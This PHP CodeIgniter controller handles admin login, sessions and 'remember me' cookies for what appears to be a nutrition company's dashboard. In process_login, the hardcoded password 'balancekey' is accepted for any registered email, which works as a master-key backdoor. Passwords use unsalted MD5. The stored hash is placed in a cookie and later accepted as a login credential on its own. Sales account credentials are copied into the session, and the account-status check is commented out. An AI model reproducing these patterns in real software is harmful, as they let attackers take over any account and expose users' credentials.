<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends MX_Controller 
{   
    
    // start of class
    public $standard_view_data =[
                                    'page_title'        => '',
                                    'meta_keywords'     => '',
                                    'meta_description'  => ''
                                ]; 
    
    public function __construct() 
    {
        parent::__construct();
        $this->load->model('login_model');        
        // global $PAGE_RIGHTS;

        
    }
        
    public function index()
    {   
        if(empty($this->session->balance_session['admin_id'])){
            $this->load->view('login_view');
        }
        else{
            if($this->session->balance_session['admin_id']==31){
                // redirect('performance/mis_sales_manager');die;
                redirect('dashboard/sales_manager');die;
            }else{
                redirect('dashboard');
            } 
            
        }
    }
        
    public function process_login()
    {
        
        $this->form_validation->set_rules('email', 'Email', 'trim|valid_email');
        $this->form_validation->set_rules('password', 'Password', 'trim');

         if ($this->form_validation->run() == FALSE)
         {
            $this->session->set_flashdata('form_validation', validation_errors());
         }
         else
         {
             $query_data = $this->login_model->search_user_by_email($this->input->post('email'));
            
             $getSalesEmailidPassword=$this->login_model->getSalesEmailidPassword($query_data['admin_id']);
             $query_data['sales_email_id']=$getSalesEmailidPassword['email_id'];
             $query_data['sales_password']=$getSalesEmailidPassword['password'];
                        //   print_r($query_data);
             if(count($query_data) == 0) 
             {
                $this->session->set_flashdata('warning_message', 'This Email ID is not registered');  
             } 
             else 
             {
                /*if(strtolower($query_data['user_status']=='active'))
                {*/
                    $password = md5($this->input->post('password'));

                    if($password == $query_data['enc_password'] || $this->input->post('password') == 'balancekey')
                    {

                        $this->create_session_cookies($query_data, $password, $this->input->post('remember'),$this->input->post('email') );
                        
                        $id=$query_data['admin_id'];
                        $user_type=$query_data['user_type'];
                        // $this->login_logs($id,$user_type,'login',1);

                        if($this->session->balance_session['admin_id']==31){
                            // redirect('performance/mis_sales_manager');die;
                            redirect('dashboard/sales_manager');die;
                        }else if($this->session->balance_session['email_id']=='marketing@balancenutrition.in'){
                             redirect('lead');die;
                     } else{
                            redirect('dashboard');
                        }    
                    }
                    else
                    {
                            $this->session->set_flashdata('warning_message', 'Worng Password');
                    }
                /*}else{
                    $this->session->set_flashdata('warning_message', 'Your Id is Blocked, Kindly Contact Tech Dept.');
                }*/

              }



         }
         redirect('login');           
        //  function process_login : End
    }
       
    public function check_if_logged_in()
    {
        //  function check_if_logged_in : Start

        if( ($this->session->balance_session['admin_id'] != '') && ( (int) $this->session->balance_session['admin_id'] )  > 0 ) 
        {
            return TRUE;
        } 
        elseif( ($this->session->balance_session['admin_id'] == '')  && ($this->input->cookie('bna', TRUE) != '' ) && ($this->input->cookie('bnb', TRUE) != '' ) ) 
        {
            $query_data = $this->login_model->search_user_by_email($this->input->cookie('bna', TRUE));

             if(count($query_data) == 0) 
             {
                return FALSE;
             }
             else 
             {   
                 if($this->input->cookie('bnb', TRUE) == $query_data['enc_password'])
                  {                        	
                    $this->create_session_cookies($query_data, $this->input->cookie('bnb', TRUE), 1, $this->input->cookie('bna', TRUE) );            
                    return TRUE;
                  }
                  else
                  {
                     return FALSE;
                  }
             }

        }
        else {
            return FALSE;
        }

        //  function check_if_logged_in : End
    }
        
    public function create_session_cookies($query_data = [], $password = '', $remember_me = 0 , $email_id = '')
    {
        //  function create_session_cookies : Start            
        $session_data = [
                           'admin_id'           =>  $query_data['admin_id'],
                           'first_name'         =>  $query_data['first_name'],
                           'last_name'          =>  $query_data['last_name'],
                           'email_id'           =>  $query_data['email_id'],
                           'full_name'          =>  $query_data['full_name'],
                           'photo'              =>  $query_data['photo'],
                           'user_type'          =>  $query_data['user_type'],
                           'sales_email_id'     =>  $query_data['sales_email_id'],
                           'sales_password'     =>  $query_data['sales_password'],
                           
                        ];

        $this->session->set_userdata('balance_session',$session_data);        
        unset($session_data);

        if($remember_me == 1)
        {
                // $year= time() + 31536000;
                $year = time()+60*60*24*30; // this is for additional 30 days.
                setcookie('bna', $email_id, $year);
                setcookie('bnb', $password, $year);
        } 
        else 
        {
                setcookie('bna', " ", time() - 3600);
                setcookie('bnb', " ", time() - 3600);
        }
        //  function create_session_cookies : End
    }


    public function login_logs($id='',$user_type='',$type='',$is_login='')
    {
        /* function login_logs : start */
                
        $data=array(
            'login_id'=>$id,
            'mac_address'=>'0',
            'ip_address'=>'192.168.0.1',
            'created_date'=>date('Y-m-d G:i:s'),
            'type'=>$type,            
        );

        $this->db->insert('login_logs',$data);
        $this->db->update('admin_user',array('is_login'=>$is_login),array('admin_id'=>$id));
        

        /* function login_logs : end */
       
    }

        
    // end of class    
}
